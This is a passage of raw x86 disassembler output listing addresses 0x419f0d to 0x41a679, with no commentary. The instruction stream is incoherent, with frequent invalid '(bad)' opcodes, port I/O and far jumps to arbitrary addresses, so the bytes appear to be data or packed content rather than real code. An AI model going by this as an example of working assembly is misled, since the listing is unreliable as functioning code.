  419f0d:	fxch   st(5)
  419f0f:	jae    0x419f67
  419f11:	dec    ebp
  419f12:	xlat   BYTE PTR ds:[ebx]
  419f13:	ins    DWORD PTR es:[edi],dx
  419f14:	pop    eax
  419f15:	pop    esi
  419f16:	sti    
  419f17:	or     DWORD PTR [ebp-0x1e],ebp
  419f1a:	pop    edi
  419f1b:	fiadd  DWORD PTR [ecx]
  419f1d:	shl    edi,1
  419f1f:	push   edx
  419f20:	outs   dx,DWORD PTR ds:[esi]
  419f21:	lds    ebp,FWORD PTR [eax]
  419f23:	mov    bh,ah
  419f25:	fnstcw WORD PTR [ebx]
  419f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f28:	push   esi
  419f29:	test   al,0xb4
  419f2b:	or     DWORD PTR [esi+0x46],edi
  419f2e:	inc    esp
  419f30:	xlat   BYTE PTR ds:[ebx]
  419f31:	inc    edx
  419f32:	std    
  419f33:	dec    ecx
  419f34:	call   DWORD PTR [ebx]
  419f36:	add    dh,BYTE PTR [edi+esi*8]
  419f39:	push   ds
  419f3a:	push   cs
  419f3b:	(bad)  
  419f3c:	adc    ebp,DWORD PTR [ebx+esi*2-0xe]
  419f40:	xor    ebx,esi
  419f42:	cdq    
  419f43:	mov    al,ds:0x35383f03
  419f48:	adc    DWORD PTR [ecx-0x78bf3700],esi
  419f4e:	gs mov ah,0xb0
  419f51:	ret    0x8180
  419f54:	pushf  
  419f55:	mov    ebp,0xd0b5cf8
  419f5a:	mov    esp,0xe6603b0b
  419f5f:	and    edx,DWORD PTR [edi]
  419f61:	sub    ecx,0x21
  419f64:	in     al,dx
  419f65:	iret   
  419f66:	mov    cs,ecx
  419f68:	push   edi
  419f69:	adc    DWORD PTR [edi-0xe],ebp
  419f6c:	je     0x419fe8
  419f6e:	fdiv   QWORD PTR [edx+0x6c7a3823]
  419f74:	pop    edi
  419f75:	loopne 0x419f53
  419f77:	push   es
  419f78:	jmp    0x419f86
  419f7a:	pop    es
  419f7b:	(bad)  
  419f7c:	int    0x76
  419f7e:	shl    BYTE PTR [esi],cl
  419f80:	int3   
  419f81:	(bad)  
  419f82:	lock ret 0x45f9
  419f86:	sbb    esp,edx
  419f88:	mov    eax,0xf73503ec
  419f8d:	inc    eax
  419f8e:	add    esp,DWORD PTR [edx-0x2bb32782]
  419f94:	in     al,dx
  419f95:	sbb    dh,ch
  419f97:	pop    ebx
  419f98:	aad    0xd2
  419f9a:	leave  
  419f9b:	lock popf 
  419f9d:	je     0x41a00a
  419f9f:	sub    DWORD PTR [edx-0x3e1a5737],edi
  419fa5:	and    dl,ah
  419fa7:	sar    BYTE PTR [esi-0x4d],cl
  419faa:	ins    BYTE PTR es:[edi],dx
  419fab:	pop    es
  419fac:	inc    esi
  419fad:	mov    ah,0xd4
  419faf:	(bad)  
  419fb0:	data16 jbe 0x419f92
  419fb3:	sub    DWORD PTR [edi+0x3dcb5c76],ecx
  419fb9:	jp     0x419f8b
  419fbb:	in     al,0x4a
  419fbd:	jne    0x419f95
  419fbf:	mov    eax,0x58aa390b
  419fc4:	cdq    
  419fc5:	repnz or DWORD PTR [eax-0x7cbd7fa1],edx
  419fcc:	retf   
  419fcd:	pop    esp
  419fce:	test   al,0x4d
  419fd0:	push   esp
  419fd1:	outs   dx,DWORD PTR ds:[esi]
  419fd2:	and    esi,DWORD PTR [esi-0x2ce11bc2]
  419fd8:	out    dx,al
  419fd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fda:	call   0x8ba8:0xd3abaad7
  419fe1:	aas    
  419fe2:	out    dx,al
  419fe3:	out    dx,al
  419fe4:	jae    0x419fb0
  419fe6:	mov    cl,0x9f
  419fe8:	xlat   BYTE PTR ds:[ebx]
  419fe9:	retf   
  419fea:	and    BYTE PTR [ecx-0x14753458],bh
  419ff0:	mov    edi,0x7dac8b53
  419ff5:	loope  0x419ffb
  419ff7:	add    ecx,esi
  419ff9:	mov    WORD PTR [ebx+0x6e5db810],gs
  419fff:	mov    dh,0x21
  41a001:	lock hlt 
  41a003:	add    al,0x6
  41a005:	push   es
  41a006:	int3   
  41a007:	in     al,0x92
  41a009:	cmp    eax,0x62a6798d
  41a00e:	loope  0x41a076
  41a010:	repnz fsubr QWORD PTR [eax+0x12]
  41a014:	fdiv   DWORD PTR [eax+eiz*8+0x24]
  41a018:	adc    dh,BYTE PTR [ecx-0x3f8ed23a]
  41a01e:	mov    dl,0x48
  41a020:	outs   dx,BYTE PTR ds:[esi]
  41a021:	outs   dx,BYTE PTR ds:[esi]
  41a022:	test   BYTE PTR [edx+0x2c2bc2ac],0x2a
  41a029:	sbb    eax,ebx
  41a02b:	and    eax,0x45dbc789
  41a030:	mov    ebx,0xb95fdc70
  41a035:	xor    bh,bh
  41a037:	dec    esi
  41a038:	(bad)  [ebp+0x73]
  41a03b:	or     al,0x21
  41a03d:	mov    ds:0xf7e5da5e,al
  41a042:	lahf   
  41a043:	jecxz  0x41a03f
  41a045:	and    bh,0x18
  41a048:	push   ebp
  41a049:	mov    bh,0x27
  41a04b:	mov    bl,0xec
  41a04d:	add    al,0xb8
  41a04f:	inc    edx
  41a050:	push   esi
  41a051:	int    0xe
  41a053:	in     eax,dx
  41a054:	and    al,0x56
  41a056:	dec    ebp
  41a057:	sbb    eax,0xc0b2bd70
  41a05c:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a05e:	xor    bl,BYTE PTR [ebx]
  41a060:	push   ss
  41a061:	clc    
  41a062:	push   0x42fbc29d
  41a067:	es push esp
  41a069:	pop    ecx
  41a06a:	aas    
  41a06b:	cmp    DWORD PTR [ebx+0x59],ebx
  41a06e:	push   es
  41a06f:	jl     0x41a064
  41a071:	inc    ecx
  41a072:	mov    edx,DWORD PTR [ebp-0x21]
  41a075:	cld    
  41a076:	inc    ecx
  41a077:	js     0x41a017
  41a079:	xor    ebp,esi
  41a07b:	mov    edx,0xa0f83598
  41a080:	arpl   WORD PTR [ebp-0x43],dx
  41a083:	rol    DWORD PTR [ecx-0x5d],1
  41a086:	lds    edx,FWORD PTR [ecx+0x66]
  41a089:	mov    ds:0x4e0b21d5,eax
  41a08e:	ret    0x535b
  41a091:	jns    0x41a101
  41a093:	push   ebx
  41a094:	sub    al,0xb6
  41a096:	inc    esp
  41a097:	and    BYTE PTR [esi-0x47e0d94],0x1e
  41a09e:	push   eax
  41a09f:	mov    cl,0xd6
  41a0a1:	ret    
  41a0a2:	add    BYTE PTR [edx-0x14],dh
  41a0a5:	push   ds
  41a0a6:	pop    esi
  41a0a7:	scas   eax,DWORD PTR es:[edi]
  41a0a8:	lea    ebp,[ebx-0x5b]
  41a0ab:	mov    BYTE PTR [eax-0x6976c0bd],al
  41a0b1:	inc    esp
  41a0b2:	jbe    0x41a0b5
  41a0b4:	out    0x34,al
  41a0b6:	pop    eax
  41a0b7:	mov    al,0xbb
  41a0b9:	sub    ebp,ebp
  41a0bb:	xor    DWORD PTR [edx+ebx*4-0x5c],0x63
  41a0c0:	stos   BYTE PTR es:[edi],al
  41a0c1:	inc    eax
  41a0c2:	cld    
  41a0c3:	add    DWORD PTR [ecx-0x420437f1],esi
  41a0c9:	jbe    0x41a073
  41a0cb:	popa   
  41a0cc:	stos   BYTE PTR es:[edi],al
  41a0cd:	les    esi,FWORD PTR [eax-0x24d85f9a]
  41a0d3:	(bad)  [eax-0x22]
  41a0d6:	in     eax,dx
  41a0d7:	popf   
  41a0d8:	ins    BYTE PTR es:[edi],dx
  41a0d9:	sub    bl,BYTE PTR ss:[ebx+0x68cc3dff]
  41a0e0:	xchg   edi,eax
  41a0e1:	adc    al,0xfc
  41a0e3:	add    BYTE PTR [ebx+0x58ae8e8],cl
  41a0e9:	pusha  
  41a0ea:	adc    BYTE PTR [ecx],ah
  41a0ec:	lea    edi,[edi]
  41a0ee:	xchg   esp,eax
  41a0ef:	mov    ebp,0xd26ba090
  41a0f4:	fwait
  41a0f5:	mov    ah,0x50
  41a0f7:	iret   
  41a0f8:	jnp    0x41a136
  41a0fa:	rol    BYTE PTR [edi],0xc9
  41a0fd:	sahf   
  41a0fe:	es xchg ecx,eax
  41a100:	mov    cl,0xcb
  41a102:	pushf  
  41a103:	mov    gs,WORD PTR [edi+eiz*8+0x5c89f730]
  41a10a:	(bad)  
  41a10b:	imul   esp,edx,0x78f61f82
  41a111:	loopne 0x41a09c
  41a113:	mov    esp,0x4f5c97fe
  41a118:	jmp    0x41a0ac
  41a11a:	gs dec ebx
  41a11c:	xor    eax,0x4663019d
  41a121:	mov    dh,0x31
  41a123:	sbb    al,0xa3
  41a125:	out    dx,eax
  41a126:	iret   
  41a127:	push   ds
  41a128:	pop    ds
  41a129:	(bad)  
  41a12b:	imul   esi,DWORD PTR [ebp+0x1],0xffffffcf
  41a12f:	pop    edx
  41a130:	sbb    ebx,DWORD PTR [eax+0xe]
  41a133:	sbb    bl,BYTE PTR fs:[ebx]
  41a136:	stc    
  41a137:	fdivr  QWORD PTR [ebp-0x53]
  41a13a:	sbb    eax,0xbc8654f0
  41a13f:	fnstsw WORD PTR [ecx]
  41a141:	scas   al,BYTE PTR es:[edi]
  41a142:	xchg   esi,esi
  41a144:	scas   eax,DWORD PTR es:[edi]
  41a145:	sti    
  41a146:	in     al,0xc1
  41a148:	iret   
  41a149:	loopne 0x41a0fd
  41a14b:	fadd   DWORD PTR [edx+0x18]
  41a14e:	mov    ebx,0xe277c7b0
  41a153:	bound  ecx,QWORD PTR [edx-0x3eac4ca]
  41a159:	mov    dh,cl
  41a15b:	push   es
  41a15c:	mov    edx,0x4959407e
  41a161:	cli    
  41a162:	push   ecx
  41a163:	out    dx,eax
  41a164:	icebp  
  41a165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a166:	fmulp  st(3),st
  41a168:	mov    dl,0xd6
  41a16a:	in     al,dx
  41a16b:	adc    al,dh
  41a16d:	sbb    ebp,esp
  41a16f:	mov    esi,0x218be7bf
  41a174:	jge    0x41a1a2
  41a176:	push   ebp
  41a177:	cwde   
  41a178:	or     eax,DWORD PTR [ebx+ecx*8-0x57]
  41a17c:	test   eax,0xdfff82d4
  41a181:	adc    ah,BYTE PTR [esp+ecx*8-0x40b54fc4]
  41a188:	add    edi,DWORD PTR [esi+ecx*8-0x2db4812c]
  41a18f:	add    esi,ecx
  41a191:	inc    ebx
  41a192:	sub    eax,0xc2e9ae9e
  41a197:	sti    
  41a198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a199:	cmc    
  41a19a:	push   edi
  41a19c:	add    al,0x43
  41a19e:	jbe    0x41a158
  41a1a0:	in     al,0xeb
  41a1a2:	ins    DWORD PTR es:[edi],dx
  41a1a3:	and    DWORD PTR [esi],ecx
  41a1a5:	jmp    0x6a7596f7
  41a1aa:	dec    esp
  41a1ab:	(bad)  
  41a1ac:	int    0x2b
  41a1ae:	in     al,0x1
  41a1b0:	(bad)  
  41a1b1:	inc    BYTE PTR [edi+0x38]
  41a1b4:	outs   dx,DWORD PTR ds:[esi]
  41a1b5:	pushf  
  41a1b6:	lods   al,BYTE PTR ds:[esi]
  41a1b7:	aaa    
  41a1b8:	xchg   edx,eax
  41a1ba:	popf   
  41a1bb:	mov    ds:0xe25b2618,eax
  41a1c0:	nop
  41a1c1:	imul   edi,DWORD PTR [edi-0x54c8e1b6],0xd1507ef1
  41a1cb:	mov    al,ds:0x45eab6e1
  41a1d0:	push   ss
  41a1d1:	add    DWORD PTR [edi+0x4d0d294e],ecx
  41a1d7:	loop   0x41a216
  41a1d9:	sub    edi,ebp
  41a1db:	lahf   
  41a1dc:	dec    eax
  41a1dd:	shr    BYTE PTR [ecx-0x4e2a6b36],1
  41a1e3:	repz scas eax,DWORD PTR es:[edi]
  41a1e5:	sbb    ecx,DWORD PTR [esi-0x22109526]
  41a1eb:	mov    edi,0x56e447fa
  41a1f0:	sub    DWORD PTR [eax+0xbc7cae9],ebx
  41a1f6:	iret   
  41a1f7:	gs push cs
  41a1f9:	jae    0x41a22d
  41a1fb:	ud1    ecx,DWORD PTR ds:0x5933abb7
  41a202:	pop    ecx
  41a203:	inc    ecx
  41a204:	pop    edi
  41a205:	jg     0x41a281
  41a207:	in     al,0x53
  41a209:	adc    eax,0x6b896423
  41a20e:	jmp    0xf145e463
  41a213:	sahf   
  41a214:	loope  0x41a259
  41a216:	pop    ebp
  41a217:	imul   esi,DWORD PTR [edx-0x5c],0xd6f7c16f
  41a21e:	mov    dh,0x83
  41a220:	stos   BYTE PTR es:[edi],al
  41a221:	inc    edi
  41a222:	aam    0x5b
  41a224:	inc    ebx
  41a225:	adc    eax,DWORD PTR es:[ebx]
  41a228:	call   0xc6cddad3
  41a22d:	inc    ebp
  41a22e:	xor    al,0x38
  41a230:	js     0x41a2a4
  41a232:	jae    0x41a22e
  41a234:	xor    DWORD PTR [esi+0x26],0x13
  41a238:	sub    BYTE PTR [ebp-0x11e79a5c],ah
  41a23e:	mov    cl,0xdd
  41a240:	stc    
  41a241:	iret   
  41a242:	adc    DWORD PTR [eax-0x3a],ebx
  41a245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a246:	shl    ecx,cl
  41a248:	arpl   WORD PTR ds:0x4ad9c0d0,di
  41a24e:	jbe    0x41a221
  41a250:	mov    al,ds:0xfe2c2897
  41a255:	stos   DWORD PTR es:[edi],eax
  41a256:	xchg   bl,al
  41a258:	ins    DWORD PTR es:[edi],dx
  41a259:	xchg   edx,eax
  41a25a:	loope  0x41a2a3
  41a25c:	jnp    0x41a2d8
  41a25e:	lock dec ecx
  41a260:	inc    esp
  41a261:	in     al,0x71
  41a263:	mov    ebx,0x364293bc
  41a268:	rol    BYTE PTR [edi],cl
  41a26a:	xor    edx,DWORD PTR [ebx-0x29125ea8]
  41a270:	lea    esp,[edi+0x4a]
  41a273:	xor    eax,DWORD PTR [ebx-0x6d]
  41a276:	xor    eax,0xa0b75af8
  41a27b:	test   al,0x4f
  41a27d:	das    
  41a27e:	in     eax,0xad
  41a280:	aad    0x1b
  41a282:	and    edx,DWORD PTR [ecx-0x80]
  41a285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a286:	loop   0x41a255
  41a288:	nop
  41a289:	sub    BYTE PTR [ecx],ah
  41a28b:	xchg   edi,eax
  41a28c:	lods   al,BYTE PTR ds:[esi]
  41a28d:	sub    eax,0x3eddc109
  41a292:	pop    es
  41a293:	lahf   
  41a294:	fisub  WORD PTR [ecx]
  41a296:	jmp    0x3b51c163
  41a29b:	mov    dh,0xd2
  41a29d:	mov    ah,BYTE PTR [eax-0x19]
  41a2a0:	xchg   edi,eax
  41a2a1:	fimul  DWORD PTR [edi]
  41a2a3:	xor    esp,ebp
  41a2a5:	cli    
  41a2a6:	pusha  
  41a2a7:	fsubr  QWORD PTR ds:0xcef60138
  41a2ad:	add    DWORD PTR [ecx-0x7c30db26],ebx
  41a2b3:	sbb    ah,BYTE PTR [ebx-0x228cc111]
  41a2b9:	nop
  41a2ba:	fnstcw WORD PTR [esp+edi*1+0x79]
  41a2be:	sub    ecx,ebx
  41a2c0:	into   
  41a2c1:	(bad)
  41a2c4:	test   eax,0x8cbe194f
  41a2c9:	ror    BYTE PTR [ecx+eiz*8-0x6dc9368e],cl
  41a2d0:	cmp    DWORD PTR [eax+0x7e83ca04],edi
  41a2d6:	in     al,dx
  41a2d7:	dec    esi
  41a2d8:	out    dx,eax
  41a2d9:	(bad)  
  41a2da:	mov    al,0x45
  41a2dc:	cli    
  41a2dd:	push   ebx
  41a2de:	out    dx,al
  41a2df:	fdivr  DWORD PTR [ecx]
  41a2e1:	aam    0x3a
  41a2e3:	xor    DWORD PTR [esi-0x72c9724b],esi
  41a2e9:	add    BYTE PTR [edx+0x62b1c708],ah
  41a2ef:	jne    0x41a2b4
  41a2f1:	push   ss
  41a2f2:	pop    ebx
  41a2f3:	(bad)  
  41a2f4:	fcomp  DWORD PTR [edx+0x74]
  41a2f7:	xchg   ebx,eax
  41a2f8:	(bad)  
  41a2f9:	xlat   BYTE PTR ds:[ebx]
  41a2fa:	push   ebx
  41a2fb:	inc    ebp
  41a2fc:	jbe    0x41a2c8
  41a2fe:	mov    ebp,0xe571abe9
  41a303:	out    0xc0,al
  41a305:	push   cs
  41a306:	pop    es
  41a307:	and    dh,BYTE PTR [esp+ecx*8+0x6cbfb78d]
  41a30e:	lods   al,BYTE PTR ds:[esi]
  41a30f:	sbb    eax,0x9daed42d
  41a314:	sub    ebx,esi
  41a316:	inc    edi
  41a317:	push   ds
  41a318:	rcr    dh,1
  41a31a:	sti    
  41a31b:	sub    bl,BYTE PTR [ebx]
  41a31d:	retf   0x7f63
  41a320:	xor    al,0x2c
  41a322:	pop    esi
  41a323:	jnp    0x41a3a2
  41a325:	out    0x6e,eax
  41a327:	retf   
  41a328:	out    0x47,al
  41a32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a32b:	fdivrp st(7),st
  41a32d:	rol    BYTE PTR [eax+ebx*2-0xb],0x5c
  41a332:	add    dh,BYTE PTR [ecx]
  41a334:	hlt    
  41a335:	les    esi,FWORD PTR [ebp-0x5a43f87e]
  41a33b:	sub    dl,dh
  41a33d:	and    BYTE PTR [ecx+0x2d],0x5c
  41a341:	(bad)  
  41a342:	pop    esi
  41a343:	fsub   st,st(0)
  41a345:	lock arpl WORD PTR [ecx],dx
  41a348:	and    al,bl
  41a34a:	cmp    ebp,DWORD PTR [edx+0x58a82c6a]
  41a350:	je     0x41a37c
  41a352:	je     0x41a2f2
  41a354:	loop   0x41a35c
  41a356:	retf   0xe2f4
  41a359:	and    eax,DWORD PTR ds:0x94d384f0
  41a35f:	or     ah,0x1
  41a362:	inc    edi
  41a363:	jns    0x41a311
  41a365:	push   edx
  41a366:	sahf   
  41a367:	in     eax,0xc3
  41a369:	mov    ebx,0x5bf860a3
  41a36e:	out    dx,eax
  41a36f:	cmp    al,0xf4
  41a371:	mov    dl,0x8
  41a373:	aad    0x7d
  41a375:	inc    edx
  41a376:	loop   0x41a367
  41a378:	pop    edx
  41a379:	arpl   WORD PTR [edi+0x4702deca],dx
  41a37f:	in     eax,dx
  41a380:	xor    bh,BYTE PTR [edx]
  41a382:	inc    eax
  41a383:	xchg   esp,eax
  41a384:	xchg   BYTE PTR [ecx-0xd772c35],ch
  41a38a:	inc    eax
  41a38b:	sti    
  41a38c:	xrelease xchg BYTE PTR cs:[ebp+0x32],dl
  41a391:	and    ah,BYTE PTR [ecx+0x67]
  41a394:	sahf   
  41a395:	adc    dl,BYTE PTR [eax-0x7a]
  41a398:	repnz imul edi,DWORD PTR [eax-0x42],0xd8d8bf48
  41a3a0:	mov    ah,0x71
  41a3a2:	jp     0x41a354
  41a3a4:	jp     0x41a32b
  41a3a6:	push   0xd11d3a36
  41a3ab:	scas   eax,DWORD PTR es:[edi]
  41a3ac:	pop    eax
  41a3ad:	and    bl,al
  41a3af:	neg    BYTE PTR [ecx]
  41a3b1:	xor    al,0x9c
  41a3b3:	cli    
  41a3b4:	pusha  
  41a3b5:	xchg   DWORD PTR [esi+0x42c17b09],ecx
  41a3bb:	imul   ebx,ecx,0x9e419472
  41a3c1:	cmp    cl,dl
  41a3c3:	add    ecx,DWORD PTR [ebx]
  41a3c5:	push   esi
  41a3c6:	or     ebx,esp
  41a3c8:	xor    DWORD PTR [edi+ebp*2+0x4c54ab76],eax
  41a3cf:	and    dl,0xaa
  41a3d2:	cmp    al,BYTE PTR [edx]
  41a3d4:	stc    
  41a3d5:	mov    ebp,0xab313e89
  41a3da:	mov    ds:0xfdbfdbe3,al
  41a3df:	jne    0x41a440
  41a3e1:	xor    al,0x2a
  41a3e3:	lods   eax,DWORD PTR ds:[esi]
  41a3e4:	add    BYTE PTR [eax+0x1b250d8c],al
  41a3ea:	mov    edi,0x6ee25e21
  41a3ef:	jmp    0x41a3b1
  41a3f1:	das    
  41a3f2:	or     eax,0xced49869
  41a3f7:	das    
  41a3f8:	or     BYTE PTR [edx],0x35
  41a3fb:	and    eax,edx
  41a3fd:	or     DWORD PTR [ecx],edx
  41a3ff:	adc    al,0xe4
  41a401:	nop
  41a402:	lods   al,BYTE PTR ds:[esi]
  41a403:	clc    
  41a404:	push   cs
  41a405:	and    edx,ebx
  41a407:	add    DWORD PTR [edx],edx
  41a409:	or     al,0xe
  41a40b:	push   ecx
  41a40c:	or     ch,bh
  41a40e:	mov    esi,0x56746f32
  41a413:	xchg   esp,eax
  41a414:	jmp    0xd586:0xffbbb18f
  41a41b:	xchg   edi,eax
  41a41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a41d:	leave  
  41a41e:	cmp    eax,0x82eeb63a
  41a423:	scas   eax,DWORD PTR es:[edi]
  41a424:	xchg   BYTE PTR [edi+0x62b01ec7],dh
  41a42a:	pop    es
  41a42b:	add    BYTE PTR [edx-0x61ce2a5b],al
  41a431:	dec    esi
  41a432:	push   ds
  41a433:	adc    DWORD PTR [edx-0x20f600e6],ecx
  41a439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a43a:	das    
  41a43b:	mov    esi,0x39ad3ee1
  41a440:	or     eax,0xab669300
  41a445:	jle    0x41a43d
  41a447:	test   DWORD PTR [eax-0x5775fcad],edx
  41a44d:	repnz mov dl,ch
  41a450:	or     eax,0x28adcce8
  41a455:	add    esi,ebx
  41a457:	mov    ch,BYTE PTR [edi]
  41a459:	lock mov esp,0x88133d97
  41a45f:	into   
  41a460:	out    dx,eax
  41a461:	xor    DWORD PTR [ebx-0x4ab5530a],0x33
  41a468:	mov    al,ds:0x4a451fe2
  41a46d:	test   eax,0x8626b9a8
  41a472:	mov    cl,dh
  41a474:	xor    BYTE PTR [edi],al
  41a476:	cld    
  41a477:	cmp    ch,0x6
  41a47a:	pushf  
  41a47b:	add    al,0x31
  41a47d:	add    al,0x1f
  41a47f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a481:	push   ebx
  41a482:	sti    
  41a483:	jb     0x41a41c
  41a485:	xor    ebx,DWORD PTR [ecx-0x63]
  41a488:	fidiv  WORD PTR [esi]
  41a48a:	pop    ds
  41a48b:	mov    ebp,0xfeceee54
  41a490:	sti    
  41a491:	pop    edi
  41a492:	cmp    ebp,edi
  41a494:	ret    0xdd1c
  41a497:	jno    0x41a4ff
  41a499:	aas    
  41a49a:	mov    BYTE PTR [ecx],bl
  41a49c:	jne    0x41a4ab
  41a49e:	xchg   edx,eax
  41a49f:	into   
  41a4a0:	inc    ecx
  41a4a1:	xchg   ecx,eax
  41a4a2:	rol    esi,0x90
  41a4a5:	sub    ah,bh
  41a4a7:	outs   dx,DWORD PTR ds:[esi]
  41a4a8:	and    al,0xd2
  41a4aa:	pop    ss
  41a4ab:	cmp    edi,ebx
  41a4ad:	popf   
  41a4ae:	mov    DWORD PTR [esi+esi*2],ecx
  41a4b1:	inc    ebx
  41a4b2:	js     0x41a4c3
  41a4b4:	cmp    eax,0x5bb88264
  41a4b9:	jmp    0xea077c4f
  41a4be:	adc    DWORD PTR [edi+0x4680b8c3],esi
  41a4c4:	jmp    0x6e3f:0x2a4058b2
  41a4cb:	sbb    ebx,DWORD PTR [eax-0x1a144f96]
  41a4d1:	jmp    0x60ea:0x20d99862
  41a4d8:	sbb    eax,eax
  41a4da:	mov    al,BYTE PTR [edi-0x52]
  41a4dd:	xchg   edx,eax
  41a4de:	jnp    0x41a4f7
  41a4e0:	(bad)  [edi-0x463e9c8d]
  41a4e6:	pop    esi
  41a4e7:	lds    esi,FWORD PTR [esi]
  41a4e9:	fdiv   QWORD PTR [esi+ebx*4]
  41a4ec:	lods   eax,DWORD PTR ds:[esi]
  41a4ed:	lds    esi,FWORD PTR [eax+0x96fb3fc]
  41a4f3:	inc    eax
  41a4f4:	cmp    esi,eax
  41a4f6:	(bad)  
  41a4f7:	sahf   
  41a4f8:	ficom  WORD PTR [edi-0x6a]
  41a4fb:	in     eax,0x56
  41a4fd:	repz popa 
  41a4ff:	aad    0x96
  41a501:	aas    
  41a502:	jbe    0x41a504
  41a504:	daa    
  41a505:	cli    
  41a506:	fadd   DWORD PTR [eax]
  41a508:	xchg   edi,eax
  41a509:	mov    edi,0xd89d07fd
  41a50e:	xchg   esp,eax
  41a50f:	ins    DWORD PTR es:[edi],dx
  41a510:	ja     0x41a51f
  41a512:	dec    esi
  41a513:	sbb    DWORD PTR [ebp-0x21],eax
  41a516:	xchg   edx,eax
  41a517:	repnz sub edx,DWORD PTR [ebx+0x329c00c1]
  41a51e:	leave  
  41a51f:	inc    ebx
  41a520:	adc    bh,BYTE PTR [esi-0x3]
  41a523:	(bad)  
  41a524:	in     al,0xf7
  41a526:	mov    cl,0x67
  41a528:	enter  0x2908,0xeb
  41a52c:	icebp  
  41a52d:	ss push ebx
  41a52f:	mov    al,0x7a
  41a531:	or     esp,DWORD PTR [edx-0x36]
  41a534:	fcomp  st(5)
  41a536:	in     al,dx
  41a537:	je     0x41a54d
  41a539:	rol    BYTE PTR [edx],cl
  41a53b:	(bad)  
  41a53c:	jns    0x41a58e
  41a53e:	(bad)  
  41a53f:	aaa    
  41a540:	aas    
  41a541:	xchg   BYTE PTR [ebx+0x5212f152],bl
  41a547:	test   DWORD PTR [ebp+0xa4bec7c],esp
  41a54d:	jb     0x41a590
  41a54f:	mov    edx,DWORD PTR [ebp+0x57bbefad]
  41a555:	inc    ecx
  41a556:	sti    
  41a557:	adc    BYTE PTR [ebp+0x26690e29],dh
  41a55d:	ret    
  41a55e:	pop    ebp
  41a55f:	pop    eax
  41a560:	hlt    
  41a561:	iret   
  41a562:	push   0x17
  41a564:	inc    ah
  41a566:	push   esi
  41a567:	add    al,0x89
  41a569:	and    eax,0xec457971
  41a56e:	int    0x41
  41a570:	pop    es
  41a571:	rcr    DWORD PTR [ebp-0x2],1
  41a574:	pop    ebx
  41a575:	int3   
  41a576:	cmc    
  41a577:	daa    
  41a578:	repz sub DWORD PTR [ebp+0x63],edi
  41a57c:	or     DWORD PTR [edx],esi
  41a57e:	xchg   DWORD PTR [ebp-0x120ebd4a],eax
  41a584:	cld    
  41a585:	daa    
  41a586:	and    eax,0x63af9e41
  41a58b:	push   ds
  41a58c:	mov    ebx,0x2755d3b0
  41a591:	rcr    BYTE PTR [eax+0x4960f19a],1
  41a597:	(bad)  
  41a598:	rcr    DWORD PTR [esi],1
  41a59a:	add    bh,BYTE PTR [eax+ebx*4+0x33]
  41a59e:	pop    es
  41a59f:	pop    ds
  41a5a0:	cmc    
  41a5a1:	and    ch,BYTE PTR ds:[ebx+0x3525b69]
  41a5a8:	gs mov esp,0xe76a7b45
  41a5ae:	pop    ebp
  41a5af:	xor    BYTE PTR [edx],ah
  41a5b1:	sbb    BYTE PTR [ecx+0x30],ch
  41a5b4:	xchg   BYTE PTR [edi],dh
  41a5b6:	xchg   esp,eax
  41a5b7:	sub    al,0xe4
  41a5b9:	fwait
  41a5ba:	leave  
  41a5bb:	imul   ebx,DWORD PTR [esi+0x2ebe57ff],0xffffffee
  41a5c2:	push   cs
  41a5c3:	jl     0x41a58b
  41a5c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5c6:	sub    al,0x98
  41a5c8:	jmp    0x331015ae
  41a5cd:	popf   
  41a5ce:	push   ecx
  41a5cf:	fstp   TBYTE PTR [ebp-0x1]
  41a5d2:	retf   0x5b40
  41a5d5:	xor    al,0x7a
  41a5d7:	mov    ecx,0x885ccec1
  41a5dc:	repz sar esi,0x21
  41a5e0:	imul   ebx,esi,0xbd707d3
  41a5e6:	out    dx,eax
  41a5e7:	mov    edx,0x90f88e60
  41a5ec:	das    
  41a5ed:	jmp    0x8f9d12a9
  41a5f2:	cmp    bl,BYTE PTR [eax-0x143412ac]
  41a5f8:	jno    0x41a63d
  41a5fa:	repz int3 
  41a5fc:	add    ecx,DWORD PTR ds:[eax-0x1a7cfd89]
  41a603:	sar    BYTE PTR [ecx+0x1a],1
  41a606:	lea    esp,[eax]
  41a608:	les    ebx,FWORD PTR [eax]
  41a60a:	(bad)  
  41a60b:	mov    bl,0x8f
  41a60d:	jae    0x41a5c8
  41a60f:	dec    ecx
  41a610:	shl    BYTE PTR [ebx+0x63],1
  41a613:	push   ds
  41a614:	ds test eax,0xb5e4295d
  41a61a:	ins    DWORD PTR es:[edi],dx
  41a61b:	ins    DWORD PTR es:[edi],dx
  41a61c:	mov    eax,0x5569457a
  41a621:	pushf  
  41a622:	js     0x41a5ce
  41a624:	mov    bh,0xbd
  41a626:	sti    
  41a627:	mov    al,0x18
  41a629:	pusha  
  41a62a:	pop    edi
  41a62b:	push   0x8db15b27
  41a630:	cmp    DWORD PTR [eax+0x4bdcc346],edx
  41a636:	add    DWORD PTR [ebx-0x55d9ef97],edx
  41a63c:	sub    DWORD PTR [ebp-0x5918b4b0],eax
  41a642:	mov    al,ds:0xc334afb8
  41a647:	pop    ds
  41a648:	es jnp 0x41a69e
  41a64b:	dec    edx
  41a64c:	jle    0x41a65e
  41a64e:	jp     0x41a5e0
  41a650:	ror    bl,cl
  41a652:	sbb    DWORD PTR [ecx],0x38565d95
  41a658:	add    al,0xa2
  41a65a:	(bad)  
  41a65c:	or     eax,0xb38edf16
  41a661:	mov    cl,0xff
  41a663:	inc    esi
  41a664:	jbe    0x41a600
  41a666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a667:	scas   eax,DWORD PTR es:[edi]
  41a668:	fadd   QWORD PTR [ecx+edx*4-0x677b4360]
  41a66f:	out    dx,eax
  41a670:	xor    ebp,ebx
  41a672:	pop    edi
  41a673:	jae    0x41a5fe
  41a675:	ja     0x41a6cb
  41a677:	sub    ah,ah
  41a679:	push   0x69343b0f
